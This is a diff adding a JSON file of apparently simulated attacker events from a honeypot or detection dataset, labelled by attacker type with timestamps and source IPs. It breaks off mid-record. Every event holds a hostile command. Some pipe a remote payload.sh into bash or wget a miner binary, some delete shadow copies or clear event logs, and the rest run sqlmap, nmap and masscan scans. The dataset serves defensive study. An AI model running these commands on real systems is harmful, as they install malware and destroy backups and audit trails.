@@ -1,0 +1,1402 @@
+[
+  {
+    "event_id": "evt-0000",
+    "attacker_type": "crypto_miner",
+    "command": "curl -s http://miner/payload.sh | bash",
+    "timestamp": "2026-03-16T18:22:09.751561+00:00",
+    "source_ip": "203.0.113.222"
+  },
+  {
+    "event_id": "evt-0001",
+    "attacker_type": "apt_actor",
+    "command": "sqlmap -u http://app?id=1",
+    "timestamp": "2026-03-16T18:22:12.751561+00:00",
+    "source_ip": "203.0.113.222"
+  },
+  {
+    "event_id": "evt-0002",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:22:15.751561+00:00",
+    "source_ip": "203.0.113.136"
+  },
+  {
+    "event_id": "evt-0003",
+    "attacker_type": "apt_actor",
+    "command": "sqlmap -u http://app?id=1",
+    "timestamp": "2026-03-16T18:22:18.751561+00:00",
+    "source_ip": "203.0.113.86"
+  },
+  {
+    "event_id": "evt-0004",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:22:21.751561+00:00",
+    "source_ip": "203.0.113.192"
+  },
+  {
+    "event_id": "evt-0005",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:22:24.751561+00:00",
+    "source_ip": "203.0.113.29"
+  },
+  {
+    "event_id": "evt-0006",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:22:27.751561+00:00",
+    "source_ip": "203.0.113.73"
+  },
+  {
+    "event_id": "evt-0007",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:22:30.751561+00:00",
+    "source_ip": "203.0.113.117"
+  },
+  {
+    "event_id": "evt-0008",
+    "attacker_type": "botnet_scanner",
+    "command": "masscan 10.0.0.0/8 -p22 --rate 10000",
+    "timestamp": "2026-03-16T18:22:33.751561+00:00",
+    "source_ip": "203.0.113.114"
+  },
+  {
+    "event_id": "evt-0009",
+    "attacker_type": "botnet_scanner",
+    "command": "masscan 10.0.0.0/8 -p22 --rate 10000",
+    "timestamp": "2026-03-16T18:22:36.751561+00:00",
+    "source_ip": "203.0.113.147"
+  },
+  {
+    "event_id": "evt-0010",
+    "attacker_type": "ransomware_operator",
+    "command": "wevtutil cl System",
+    "timestamp": "2026-03-16T18:22:39.751561+00:00",
+    "source_ip": "203.0.113.76"
+  },
+  {
+    "event_id": "evt-0011",
+    "attacker_type": "crypto_miner",
+    "command": "curl -s http://miner/payload.sh | bash",
+    "timestamp": "2026-03-16T18:22:42.751561+00:00",
+    "source_ip": "203.0.113.227"
+  },
+  {
+    "event_id": "evt-0012",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:22:45.751561+00:00",
+    "source_ip": "203.0.113.7"
+  },
+  {
+    "event_id": "evt-0013",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:22:48.751561+00:00",
+    "source_ip": "203.0.113.48"
+  },
+  {
+    "event_id": "evt-0014",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:22:51.751561+00:00",
+    "source_ip": "203.0.113.37"
+  },
+  {
+    "event_id": "evt-0015",
+    "attacker_type": "ransomware_operator",
+    "command": "wevtutil cl System",
+    "timestamp": "2026-03-16T18:22:54.751561+00:00",
+    "source_ip": "203.0.113.129"
+  },
+  {
+    "event_id": "evt-0016",
+    "attacker_type": "apt_actor",
+    "command": "sqlmap -u http://app?id=1",
+    "timestamp": "2026-03-16T18:22:57.751561+00:00",
+    "source_ip": "203.0.113.15"
+  },
+  {
+    "event_id": "evt-0017",
+    "attacker_type": "crypto_miner",
+    "command": "curl -s http://miner/payload.sh | bash",
+    "timestamp": "2026-03-16T18:23:00.751561+00:00",
+    "source_ip": "203.0.113.17"
+  },
+  {
+    "event_id": "evt-0018",
+    "attacker_type": "crypto_miner",
+    "command": "curl -s http://miner/payload.sh | bash",
+    "timestamp": "2026-03-16T18:23:03.751561+00:00",
+    "source_ip": "203.0.113.32"
+  },
+  {
+    "event_id": "evt-0019",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:23:06.751561+00:00",
+    "source_ip": "203.0.113.98"
+  },
+  {
+    "event_id": "evt-0020",
+    "attacker_type": "ransomware_operator",
+    "command": "vssadmin delete shadows /all",
+    "timestamp": "2026-03-16T18:23:09.751561+00:00",
+    "source_ip": "203.0.113.247"
+  },
+  {
+    "event_id": "evt-0021",
+    "attacker_type": "crypto_miner",
+    "command": "wget http://miner/runner",
+    "timestamp": "2026-03-16T18:23:12.751561+00:00",
+    "source_ip": "203.0.113.230"
+  },
+  {
+    "event_id": "evt-0022",
+    "attacker_type": "ransomware_operator",
+    "command": "vssadmin delete shadows /all",
+    "timestamp": "2026-03-16T18:23:15.751561+00:00",
+    "source_ip": "203.0.113.80"
+  },
+  {
+    "event_id": "evt-0023",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:23:18.751561+00:00",
+    "source_ip": "203.0.113.31"
+  },
+  {
+    "event_id": "evt-0024",
+    "attacker_type": "ransomware_operator",
+    "command": "wevtutil cl System",
+    "timestamp": "2026-03-16T18:23:21.751561+00:00",
+    "source_ip": "203.0.113.176"
+  },
+  {
+    "event_id": "evt-0025",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:23:24.751561+00:00",
+    "source_ip": "203.0.113.187"
+  },
+  {
+    "event_id": "evt-0026",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:23:27.751561+00:00",
+    "source_ip": "203.0.113.39"
+  },
+  {
+    "event_id": "evt-0027",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:23:30.751561+00:00",
+    "source_ip": "203.0.113.10"
+  },
+  {
+    "event_id": "evt-0028",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:23:33.751561+00:00",
+    "source_ip": "203.0.113.154"
+  },
+  {
+    "event_id": "evt-0029",
+    "attacker_type": "ransomware_operator",
+    "command": "vssadmin delete shadows /all",
+    "timestamp": "2026-03-16T18:23:36.751561+00:00",
+    "source_ip": "203.0.113.122"
+  },
+  {
+    "event_id": "evt-0030",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:23:39.751561+00:00",
+    "source_ip": "203.0.113.208"
+  },
+  {
+    "event_id": "evt-0031",
+    "attacker_type": "crypto_miner",
+    "command": "curl -s http://miner/payload.sh | bash",
+    "timestamp": "2026-03-16T18:23:42.751561+00:00",
+    "source_ip": "203.0.113.95"
+  },
+  {
+    "event_id": "evt-0032",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:23:45.751561+00:00",
+    "source_ip": "203.0.113.13"
+  },
+  {
+    "event_id": "evt-0033",
+    "attacker_type": "botnet_scanner",
+    "command": "masscan 10.0.0.0/8 -p22 --rate 10000",
+    "timestamp": "2026-03-16T18:23:48.751561+00:00",
+    "source_ip": "203.0.113.160"
+  },
+  {
+    "event_id": "evt-0034",
+    "attacker_type": "crypto_miner",
+    "command": "curl -s http://miner/payload.sh | bash",
+    "timestamp": "2026-03-16T18:23:51.751561+00:00",
+    "source_ip": "203.0.113.43"
+  },
+  {
+    "event_id": "evt-0035",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:23:54.751561+00:00",
+    "source_ip": "203.0.113.145"
+  },
+  {
+    "event_id": "evt-0036",
+    "attacker_type": "apt_actor",
+    "command": "sqlmap -u http://app?id=1",
+    "timestamp": "2026-03-16T18:23:57.751561+00:00",
+    "source_ip": "203.0.113.253"
+  },
+  {
+    "event_id": "evt-0037",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:24:00.751561+00:00",
+    "source_ip": "203.0.113.219"
+  },
+  {
+    "event_id": "evt-0038",
+    "attacker_type": "ransomware_operator",
+    "command": "vssadmin delete shadows /all",
+    "timestamp": "2026-03-16T18:24:03.751561+00:00",
+    "source_ip": "203.0.113.34"
+  },
+  {
+    "event_id": "evt-0039",
+    "attacker_type": "crypto_miner",
+    "command": "curl -s http://miner/payload.sh | bash",
+    "timestamp": "2026-03-16T18:24:06.751561+00:00",
+    "source_ip": "203.0.113.120"
+  },
+  {
+    "event_id": "evt-0040",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:24:09.751561+00:00",
+    "source_ip": "203.0.113.238"
+  },
+  {
+    "event_id": "evt-0041",
+    "attacker_type": "crypto_miner",
+    "command": "curl -s http://miner/payload.sh | bash",
+    "timestamp": "2026-03-16T18:24:12.751561+00:00",
+    "source_ip": "203.0.113.241"
+  },
+  {
+    "event_id": "evt-0042",
+    "attacker_type": "apt_actor",
+    "command": "sqlmap -u http://app?id=1",
+    "timestamp": "2026-03-16T18:24:15.751561+00:00",
+    "source_ip": "203.0.113.7"
+  },
+  {
+    "event_id": "evt-0043",
+    "attacker_type": "ransomware_operator",
+    "command": "vssadmin delete shadows /all",
+    "timestamp": "2026-03-16T18:24:18.751561+00:00",
+    "source_ip": "203.0.113.50"
+  },
+  {
+    "event_id": "evt-0044",
+    "attacker_type": "crypto_miner",
+    "command": "wget http://miner/runner",
+    "timestamp": "2026-03-16T18:24:21.751561+00:00",
+    "source_ip": "203.0.113.176"
+  },
+  {
+    "event_id": "evt-0045",
+    "attacker_type": "botnet_scanner",
+    "command": "masscan 10.0.0.0/8 -p22 --rate 10000",
+    "timestamp": "2026-03-16T18:24:24.751561+00:00",
+    "source_ip": "203.0.113.198"
+  },
+  {
+    "event_id": "evt-0046",
+    "attacker_type": "ransomware_operator",
+    "command": "wevtutil cl System",
+    "timestamp": "2026-03-16T18:24:27.751561+00:00",
+    "source_ip": "203.0.113.226"
+  },
+  {
+    "event_id": "evt-0047",
+    "attacker_type": "ransomware_operator",
+    "command": "vssadmin delete shadows /all",
+    "timestamp": "2026-03-16T18:24:30.751561+00:00",
+    "source_ip": "203.0.113.79"
+  },
+  {
+    "event_id": "evt-0048",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:24:33.751561+00:00",
+    "source_ip": "203.0.113.58"
+  },
+  {
+    "event_id": "evt-0049",
+    "attacker_type": "ransomware_operator",
+    "command": "wevtutil cl System",
+    "timestamp": "2026-03-16T18:24:36.751561+00:00",
+    "source_ip": "203.0.113.92"
+  },
+  {
+    "event_id": "evt-0050",
+    "attacker_type": "crypto_miner",
+    "command": "curl -s http://miner/payload.sh | bash",
+    "timestamp": "2026-03-16T18:24:39.751561+00:00",
+    "source_ip": "203.0.113.11"
+  },
+  {
+    "event_id": "evt-0051",
+    "attacker_type": "apt_actor",
+    "command": "sqlmap -u http://app?id=1",
+    "timestamp": "2026-03-16T18:24:42.751561+00:00",
+    "source_ip": "203.0.113.11"
+  },
+  {
+    "event_id": "evt-0052",
+    "attacker_type": "crypto_miner",
+    "command": "wget http://miner/runner",
+    "timestamp": "2026-03-16T18:24:45.751561+00:00",
+    "source_ip": "203.0.113.13"
+  },
+  {
+    "event_id": "evt-0053",
+    "attacker_type": "ransomware_operator",
+    "command": "vssadmin delete shadows /all",
+    "timestamp": "2026-03-16T18:24:48.751561+00:00",
+    "source_ip": "203.0.113.140"
+  },
+  {
+    "event_id": "evt-0054",
+    "attacker_type": "crypto_miner",
+    "command": "curl -s http://miner/payload.sh | bash",
+    "timestamp": "2026-03-16T18:24:51.751561+00:00",
+    "source_ip": "203.0.113.173"
+  },
+  {
+    "event_id": "evt-0055",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:24:54.751561+00:00",
+    "source_ip": "203.0.113.13"
+  },
+  {
+    "event_id": "evt-0056",
+    "attacker_type": "ransomware_operator",
+    "command": "vssadmin delete shadows /all",
+    "timestamp": "2026-03-16T18:24:57.751561+00:00",
+    "source_ip": "203.0.113.25"
+  },
+  {
+    "event_id": "evt-0057",
+    "attacker_type": "ransomware_operator",
+    "command": "wevtutil cl System",
+    "timestamp": "2026-03-16T18:25:00.751561+00:00",
+    "source_ip": "203.0.113.157"
+  },
+  {
+    "event_id": "evt-0058",
+    "attacker_type": "apt_actor",
+    "command": "sqlmap -u http://app?id=1",
+    "timestamp": "2026-03-16T18:25:03.751561+00:00",
+    "source_ip": "203.0.113.53"
+  },
+  {
+    "event_id": "evt-0059",
+    "attacker_type": "botnet_scanner",
+    "command": "masscan 10.0.0.0/8 -p22 --rate 10000",
+    "timestamp": "2026-03-16T18:25:06.751561+00:00",
+    "source_ip": "203.0.113.38"
+  },
+  {
+    "event_id": "evt-0060",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:25:09.751561+00:00",
+    "source_ip": "203.0.113.116"
+  },
+  {
+    "event_id": "evt-0061",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:25:12.751561+00:00",
+    "source_ip": "203.0.113.30"
+  },
+  {
+    "event_id": "evt-0062",
+    "attacker_type": "apt_actor",
+    "command": "sqlmap -u http://app?id=1",
+    "timestamp": "2026-03-16T18:25:15.751561+00:00",
+    "source_ip": "203.0.113.120"
+  },
+  {
+    "event_id": "evt-0063",
+    "attacker_type": "crypto_miner",
+    "command": "curl -s http://miner/payload.sh | bash",
+    "timestamp": "2026-03-16T18:25:18.751561+00:00",
+    "source_ip": "203.0.113.241"
+  },
+  {
+    "event_id": "evt-0064",
+    "attacker_type": "botnet_scanner",
+    "command": "masscan 10.0.0.0/8 -p22 --rate 10000",
+    "timestamp": "2026-03-16T18:25:21.751561+00:00",
+    "source_ip": "203.0.113.162"
+  },
+  {
+    "event_id": "evt-0065",
+    "attacker_type": "botnet_scanner",
+    "command": "masscan 10.0.0.0/8 -p22 --rate 10000",
+    "timestamp": "2026-03-16T18:25:24.751561+00:00",
+    "source_ip": "203.0.113.128"
+  },
+  {
+    "event_id": "evt-0066",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:25:27.751561+00:00",
+    "source_ip": "203.0.113.92"
+  },
+  {
+    "event_id": "evt-0067",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:25:30.751561+00:00",
+    "source_ip": "203.0.113.228"
+  },
+  {
+    "event_id": "evt-0068",
+    "attacker_type": "ransomware_operator",
+    "command": "vssadmin delete shadows /all",
+    "timestamp": "2026-03-16T18:25:33.751561+00:00",
+    "source_ip": "203.0.113.34"
+  },
+  {
+    "event_id": "evt-0069",
+    "attacker_type": "ransomware_operator",
+    "command": "vssadmin delete shadows /all",
+    "timestamp": "2026-03-16T18:25:36.751561+00:00",
+    "source_ip": "203.0.113.177"
+  },
+  {
+    "event_id": "evt-0070",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:25:39.751561+00:00",
+    "source_ip": "203.0.113.165"
+  },
+  {
+    "event_id": "evt-0071",
+    "attacker_type": "botnet_scanner",
+    "command": "masscan 10.0.0.0/8 -p22 --rate 10000",
+    "timestamp": "2026-03-16T18:25:42.751561+00:00",
+    "source_ip": "203.0.113.147"
+  },
+  {
+    "event_id": "evt-0072",
+    "attacker_type": "crypto_miner",
+    "command": "wget http://miner/runner",
+    "timestamp": "2026-03-16T18:25:45.751561+00:00",
+    "source_ip": "203.0.113.142"
+  },
+  {
+    "event_id": "evt-0073",
+    "attacker_type": "apt_actor",
+    "command": "sqlmap -u http://app?id=1",
+    "timestamp": "2026-03-16T18:25:48.751561+00:00",
+    "source_ip": "203.0.113.54"
+  },
+  {
+    "event_id": "evt-0074",
+    "attacker_type": "crypto_miner",
+    "command": "wget http://miner/runner",
+    "timestamp": "2026-03-16T18:25:51.751561+00:00",
+    "source_ip": "203.0.113.177"
+  },
+  {
+    "event_id": "evt-0075",
+    "attacker_type": "ransomware_operator",
+    "command": "vssadmin delete shadows /all",
+    "timestamp": "2026-03-16T18:25:54.751561+00:00",
+    "source_ip": "203.0.113.190"
+  },
+  {
+    "event_id": "evt-0076",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:25:57.751561+00:00",
+    "source_ip": "203.0.113.146"
+  },
+  {
+    "event_id": "evt-0077",
+    "attacker_type": "apt_actor",
+    "command": "sqlmap -u http://app?id=1",
+    "timestamp": "2026-03-16T18:26:00.751561+00:00",
+    "source_ip": "203.0.113.163"
+  },
+  {
+    "event_id": "evt-0078",
+    "attacker_type": "ransomware_operator",
+    "command": "wevtutil cl System",
+    "timestamp": "2026-03-16T18:26:03.751561+00:00",
+    "source_ip": "203.0.113.93"
+  },
+  {
+    "event_id": "evt-0079",
+    "attacker_type": "ransomware_operator",
+    "command": "wevtutil cl System",
+    "timestamp": "2026-03-16T18:26:06.751561+00:00",
+    "source_ip": "203.0.113.190"
+  },
+  {
+    "event_id": "evt-0080",
+    "attacker_type": "crypto_miner",
+    "command": "wget http://miner/runner",
+    "timestamp": "2026-03-16T18:26:09.751561+00:00",
+    "source_ip": "203.0.113.75"
+  },
+  {
+    "event_id": "evt-0081",
+    "attacker_type": "crypto_miner",
+    "command": "curl -s http://miner/payload.sh | bash",
+    "timestamp": "2026-03-16T18:26:12.751561+00:00",
+    "source_ip": "203.0.113.185"
+  },
+  {
+    "event_id": "evt-0082",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:26:15.751561+00:00",
+    "source_ip": "203.0.113.158"
+  },
+  {
+    "event_id": "evt-0083",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:26:18.751561+00:00",
+    "source_ip": "203.0.113.242"
+  },
+  {
+    "event_id": "evt-0084",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:26:21.751561+00:00",
+    "source_ip": "203.0.113.192"
+  },
+  {
+    "event_id": "evt-0085",
+    "attacker_type": "crypto_miner",
+    "command": "curl -s http://miner/payload.sh | bash",
+    "timestamp": "2026-03-16T18:26:24.751561+00:00",
+    "source_ip": "203.0.113.148"
+  },
+  {
+    "event_id": "evt-0086",
+    "attacker_type": "crypto_miner",
+    "command": "wget http://miner/runner",
+    "timestamp": "2026-03-16T18:26:27.751561+00:00",
+    "source_ip": "203.0.113.41"
+  },
+  {
+    "event_id": "evt-0087",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:26:30.751561+00:00",
+    "source_ip": "203.0.113.48"
+  },
+  {
+    "event_id": "evt-0088",
+    "attacker_type": "crypto_miner",
+    "command": "wget http://miner/runner",
+    "timestamp": "2026-03-16T18:26:33.751561+00:00",
+    "source_ip": "203.0.113.140"
+  },
+  {
+    "event_id": "evt-0089",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:26:36.751561+00:00",
+    "source_ip": "203.0.113.63"
+  },
+  {
+    "event_id": "evt-0090",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:26:39.751561+00:00",
+    "source_ip": "203.0.113.139"
+  },
+  {
+    "event_id": "evt-0091",
+    "attacker_type": "apt_actor",
+    "command": "sqlmap -u http://app?id=1",
+    "timestamp": "2026-03-16T18:26:42.751561+00:00",
+    "source_ip": "203.0.113.87"
+  },
+  {
+    "event_id": "evt-0092",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:26:45.751561+00:00",
+    "source_ip": "203.0.113.91"
+  },
+  {
+    "event_id": "evt-0093",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:26:48.751561+00:00",
+    "source_ip": "203.0.113.102"
+  },
+  {
+    "event_id": "evt-0094",
+    "attacker_type": "apt_actor",
+    "command": "sqlmap -u http://app?id=1",
+    "timestamp": "2026-03-16T18:26:51.751561+00:00",
+    "source_ip": "203.0.113.176"
+  },
+  {
+    "event_id": "evt-0095",
+    "attacker_type": "apt_actor",
+    "command": "sqlmap -u http://app?id=1",
+    "timestamp": "2026-03-16T18:26:54.751561+00:00",
+    "source_ip": "203.0.113.86"
+  },
+  {
+    "event_id": "evt-0096",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:26:57.751561+00:00",
+    "source_ip": "203.0.113.225"
+  },
+  {
+    "event_id": "evt-0097",
+    "attacker_type": "ransomware_operator",
+    "command": "wevtutil cl System",
+    "timestamp": "2026-03-16T18:27:00.751561+00:00",
+    "source_ip": "203.0.113.18"
+  },
+  {
+    "event_id": "evt-0098",
+    "attacker_type": "ransomware_operator",
+    "command": "vssadmin delete shadows /all",
+    "timestamp": "2026-03-16T18:27:03.751561+00:00",
+    "source_ip": "203.0.113.54"
+  },
+  {
+    "event_id": "evt-0099",
+    "attacker_type": "botnet_scanner",
+    "command": "masscan 10.0.0.0/8 -p22 --rate 10000",
+    "timestamp": "2026-03-16T18:27:06.751561+00:00",
+    "source_ip": "203.0.113.38"
+  },
+  {
+    "event_id": "evt-0100",
+    "attacker_type": "crypto_miner",
+    "command": "curl -s http://miner/payload.sh | bash",
+    "timestamp": "2026-03-16T18:27:09.751561+00:00",
+    "source_ip": "203.0.113.41"
+  },
+  {
+    "event_id": "evt-0101",
+    "attacker_type": "ransomware_operator",
+    "command": "vssadmin delete shadows /all",
+    "timestamp": "2026-03-16T18:27:12.751561+00:00",
+    "source_ip": "203.0.113.185"
+  },
+  {
+    "event_id": "evt-0102",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:27:15.751561+00:00",
+    "source_ip": "203.0.113.24"
+  },
+  {
+    "event_id": "evt-0103",
+    "attacker_type": "crypto_miner",
+    "command": "wget http://miner/runner",
+    "timestamp": "2026-03-16T18:27:18.751561+00:00",
+    "source_ip": "203.0.113.45"
+  },
+  {
+    "event_id": "evt-0104",
+    "attacker_type": "crypto_miner",
+    "command": "curl -s http://miner/payload.sh | bash",
+    "timestamp": "2026-03-16T18:27:21.751561+00:00",
+    "source_ip": "203.0.113.92"
+  },
+  {
+    "event_id": "evt-0105",
+    "attacker_type": "crypto_miner",
+    "command": "wget http://miner/runner",
+    "timestamp": "2026-03-16T18:27:24.751561+00:00",
+    "source_ip": "203.0.113.47"
+  },
+  {
+    "event_id": "evt-0106",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:27:27.751561+00:00",
+    "source_ip": "203.0.113.40"
+  },
+  {
+    "event_id": "evt-0107",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:27:30.751561+00:00",
+    "source_ip": "203.0.113.63"
+  },
+  {
+    "event_id": "evt-0108",
+    "attacker_type": "crypto_miner",
+    "command": "wget http://miner/runner",
+    "timestamp": "2026-03-16T18:27:33.751561+00:00",
+    "source_ip": "203.0.113.24"
+  },
+  {
+    "event_id": "evt-0109",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:27:36.751561+00:00",
+    "source_ip": "203.0.113.142"
+  },
+  {
+    "event_id": "evt-0110",
+    "attacker_type": "crypto_miner",
+    "command": "curl -s http://miner/payload.sh | bash",
+    "timestamp": "2026-03-16T18:27:39.751561+00:00",
+    "source_ip": "203.0.113.188"
+  },
+  {
+    "event_id": "evt-0111",
+    "attacker_type": "ransomware_operator",
+    "command": "vssadmin delete shadows /all",
+    "timestamp": "2026-03-16T18:27:42.751561+00:00",
+    "source_ip": "203.0.113.20"
+  },
+  {
+    "event_id": "evt-0112",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:27:45.751561+00:00",
+    "source_ip": "203.0.113.215"
+  },
+  {
+    "event_id": "evt-0113",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:27:48.751561+00:00",
+    "source_ip": "203.0.113.235"
+  },
+  {
+    "event_id": "evt-0114",
+    "attacker_type": "crypto_miner",
+    "command": "curl -s http://miner/payload.sh | bash",
+    "timestamp": "2026-03-16T18:27:51.751561+00:00",
+    "source_ip": "203.0.113.43"
+  },
+  {
+    "event_id": "evt-0115",
+    "attacker_type": "apt_actor",
+    "command": "sqlmap -u http://app?id=1",
+    "timestamp": "2026-03-16T18:27:54.751561+00:00",
+    "source_ip": "203.0.113.58"
+  },
+  {
+    "event_id": "evt-0116",
+    "attacker_type": "ransomware_operator",
+    "command": "wevtutil cl System",
+    "timestamp": "2026-03-16T18:27:57.751561+00:00",
+    "source_ip": "203.0.113.67"
+  },
+  {
+    "event_id": "evt-0117",
+    "attacker_type": "ransomware_operator",
+    "command": "vssadmin delete shadows /all",
+    "timestamp": "2026-03-16T18:28:00.751561+00:00",
+    "source_ip": "203.0.113.207"
+  },
+  {
+    "event_id": "evt-0118",
+    "attacker_type": "crypto_miner",
+    "command": "wget http://miner/runner",
+    "timestamp": "2026-03-16T18:28:03.751561+00:00",
+    "source_ip": "203.0.113.71"
+  },
+  {
+    "event_id": "evt-0119",
+    "attacker_type": "ransomware_operator",
+    "command": "wevtutil cl System",
+    "timestamp": "2026-03-16T18:28:06.751561+00:00",
+    "source_ip": "203.0.113.119"
+  },
+  {
+    "event_id": "evt-0120",
+    "attacker_type": "ransomware_operator",
+    "command": "wevtutil cl System",
+    "timestamp": "2026-03-16T18:28:09.751561+00:00",
+    "source_ip": "203.0.113.22"
+  },
+  {
+    "event_id": "evt-0121",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:28:12.751561+00:00",
+    "source_ip": "203.0.113.174"
+  },
+  {
+    "event_id": "evt-0122",
+    "attacker_type": "botnet_scanner",
+    "command": "masscan 10.0.0.0/8 -p22 --rate 10000",
+    "timestamp": "2026-03-16T18:28:15.751561+00:00",
+    "source_ip": "203.0.113.187"
+  },
+  {
+    "event_id": "evt-0123",
+    "attacker_type": "crypto_miner",
+    "command": "wget http://miner/runner",
+    "timestamp": "2026-03-16T18:28:18.751561+00:00",
+    "source_ip": "203.0.113.129"
+  },
+  {
+    "event_id": "evt-0124",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:28:21.751561+00:00",
+    "source_ip": "203.0.113.145"
+  },
+  {
+    "event_id": "evt-0125",
+    "attacker_type": "ransomware_operator",
+    "command": "wevtutil cl System",
+    "timestamp": "2026-03-16T18:28:24.751561+00:00",
+    "source_ip": "203.0.113.171"
+  },
+  {
+    "event_id": "evt-0126",
+    "attacker_type": "ransomware_operator",
+    "command": "wevtutil cl System",
+    "timestamp": "2026-03-16T18:28:27.751561+00:00",
+    "source_ip": "203.0.113.200"
+  },
+  {
+    "event_id": "evt-0127",
+    "attacker_type": "apt_actor",
+    "command": "proxychains nmap -sT target",
+    "timestamp": "2026-03-16T18:28:30.751561+00:00",
+    "source_ip": "203.0.113.24"
+  },
+  {
+    "event_id": "evt-0128",
+    "attacker_type": "botnet_scanner",
+    "command": "masscan 10.0.0.0/8 -p22 --rate 10000",
+    "timestamp": "2026-03-16T18:28:33.751561+00:00",
+    "source_ip": "203.0.113.126"
+  },
+  {
+    "event_id": "evt-0129",
+    "attacker_type": "crypto_miner",
+    "command": "curl -s http://miner/payload.sh | bash",
+    "timestamp": "2026-03-16T18:28:36.751561+00:00",
+    "source_ip": "203.0.113.123"
+  },
+  {
+    "event_id": "evt-0130",
+    "attacker_type": "botnet_scanner",
+    "command": "masscan 10.0.0.0/8 -p22 --rate 10000",
+    "timestamp": "2026-03-16T18:28:39.751561+00:00",
+    "source_ip": "203.0.113.72"
+  },
+  {
+    "event_id": "evt-0131",
+    "attacker_type": "apt_actor",
+    "command": "sqlmap -u http://app?id=1",
+    "timestamp": "2026-03-16T18:28:42.751561+00:00",
+    "source_ip": "203.0.113.170"
+  },
+  {
+    "event_id": "evt-0132",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:28:45.751561+00:00",
+    "source_ip": "203.0.113.60"
+  },
+  {
+    "event_id": "evt-0133",
+    "attacker_type": "botnet_scanner",
+    "command": "nmap -sV 10.10.0.0/24",
+    "timestamp": "2026-03-16T18:28:48.751561+00:00",
+    "source_ip": "203.0.113.102"
+  },
+  {
+    "event_id": "evt-0134",
+    "attacker_type": "ransomware_operator",
+    "command": "vssadmin delete shadows /all",
+    "timestamp": "2026-03-16T18:28:51.751561+00:00",
